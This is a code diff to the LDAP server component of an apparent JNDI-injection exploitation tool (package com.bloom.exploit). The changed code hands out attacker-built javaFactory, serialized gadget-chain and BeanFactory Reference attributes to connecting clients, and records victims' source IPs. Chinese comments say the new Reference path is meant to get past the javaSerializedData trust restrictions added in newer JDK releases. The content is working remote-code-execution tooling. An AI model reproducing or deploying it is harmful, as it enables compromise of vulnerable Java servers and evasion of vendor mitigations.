@@ -18,8 +18,11 @@ import com.unboundid.util.Base64;
 import javax.net.ServerSocketFactory;
 import javax.net.SocketFactory;
 import javax.net.ssl.SSLSocketFactory;
+import javax.naming.RefAddr;
+import javax.naming.Reference;
 import java.net.InetAddress;
 import java.net.URL;
+import java.util.Enumeration;
 
 import com.bloom.exploit.chain.ChainDispatcher;
 import static com.bloom.util.Functions.getRandomString;
@@ -101,18 +104,42 @@ public class LdapServer extends InMemoryOperationInterceptor {
                 e.addAttribute("javaFactory", className);
                 payloadResult = className;
             } else {
-                String s = ChainDispatcher.generate(route);
-                try {
-                    e.addAttribute("javaSerializedData", Base64.decode(s));
-                    payloadResult = s;
-                } catch (Exception e1) {
-                    System.out.println("生成payload失败，使用的模块类型不正确或者命令错误");
+                // BeanFactory/Reference 系默认直返 Reference 属性（JDK 8u381+/11.0.20+/17.0.8+
+                // 起 javaSerializedData 默认不被客户端信任）；--force-serialize 回退旧行为。
+                Reference ref = config.forceSerialize ? null : ChainDispatcher.generateReference(route);
+                if (ref != null) {
+                    writeReferenceAttributes(e, ref);
+                    payloadResult = "ref:" + route.getPayloadType();
+                } else {
+                    String s = ChainDispatcher.generate(route);
+                    try {
+                        e.addAttribute("javaSerializedData", Base64.decode(s));
+                        payloadResult = s;
+                    } catch (Exception e1) {
+                        System.out.println("生成payload失败，使用的模块类型不正确或者命令错误");
+                    }
                 }
             }
 
             session.recordHit(sourceIp, route, payloadResult);
             result.sendSearchEntry(e);
             result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
+        }
+
+        // 把 Reference 拆成 JNDI LDAP 属性（javaClassName/javaFactory/javaReferenceAddress），
+        // javaReferenceAddress 按 RefAddr 序号编码为 #<i>#<type>#<content>（RFC 2713 语义手写）。
+        private void writeReferenceAttributes ( Entry e, Reference ref ) {
+            e.setAttribute("javaClassName", ref.getClassName());
+            e.setAttribute("javaFactory", ref.getFactoryClassName());
+            e.addAttribute("objectClass", "javaNamingReference");
+            Enumeration<? extends RefAddr> addrs = ref.getAll();
+            int i = 0;
+            while (addrs.hasMoreElements()) {
+                RefAddr addr = addrs.nextElement();
+                String content = addr.getContent() == null ? "" : addr.getContent().toString();
+                e.addAttribute("javaReferenceAddress", "#" + i + "#" + addr.getType() + "#" + content);
+                i++;
+            }
         }
     }
 
